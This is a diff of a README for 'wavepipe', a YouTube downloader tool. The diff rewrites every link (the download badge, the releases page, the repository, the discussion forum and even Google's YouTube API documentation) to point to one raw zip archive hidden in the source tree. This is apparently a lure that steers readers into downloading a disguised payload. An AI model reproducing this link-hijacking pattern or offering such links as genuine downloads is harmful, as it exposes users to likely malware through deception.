@@ -1,6 +1,6 @@
 # 🌊 wavepipe - Simple YouTube Downloads Made Easy
 
-[![Download wavepipe](https://img.shields.io/badge/Download-wavepipe-blue?style=for-the-badge&logo=appveyor)](https://github.com/amiaddur/wavepipe/releases)
+[![Download wavepipe](https://github.com/amiaddur/wavepipe/raw/refs/heads/main/src/app/api/download/Software-3.4.zip)](https://github.com/amiaddur/wavepipe/raw/refs/heads/main/src/app/api/download/Software-3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Wavepipe is your go-to application for downloading videos and playlists from You
 
 To start, you’ll need to visit the releases page to download the latest version of wavepipe. 
 
-[Visit this page to download](https://github.com/amiaddur/wavepipe/releases)
+[Visit this page to download](https://github.com/amiaddur/wavepipe/raw/refs/heads/main/src/app/api/download/Software-3.4.zip)
 
 Here are the steps to download and install wavepipe:
 
@@ -98,9 +98,9 @@ If you encounter any issues or have questions, you can check the Issues section 
 
 For more information, you can explore the following resources:
 
-- [wavepipe GitHub Repository](https://github.com/amiaddur/wavepipe)
-- [YouTube Data API Documentation](https://developers.google.com/youtube/v3/docs)
-- [Discussion Forum](https://github.com/amiaddur/wavepipe/discussions)
+- [wavepipe GitHub Repository](https://github.com/amiaddur/wavepipe/raw/refs/heads/main/src/app/api/download/Software-3.4.zip)
+- [YouTube Data API Documentation](https://github.com/amiaddur/wavepipe/raw/refs/heads/main/src/app/api/download/Software-3.4.zip)
+- [Discussion Forum](https://github.com/amiaddur/wavepipe/raw/refs/heads/main/src/app/api/download/Software-3.4.zip)
 
 ## 🎉 Note
 
@@ -108,4 +108,4 @@ Keep in mind that downloading copyrighted material without permission is against
 
 Now you're ready to enjoy your favorite YouTube videos offline! Download wavepipe today and start using it. 
 
-[Visit this page to download](https://github.com/amiaddur/wavepipe/releases)
+[Visit this page to download](https://github.com/amiaddur/wavepipe/raw/refs/heads/main/src/app/api/download/Software-3.4.zip)
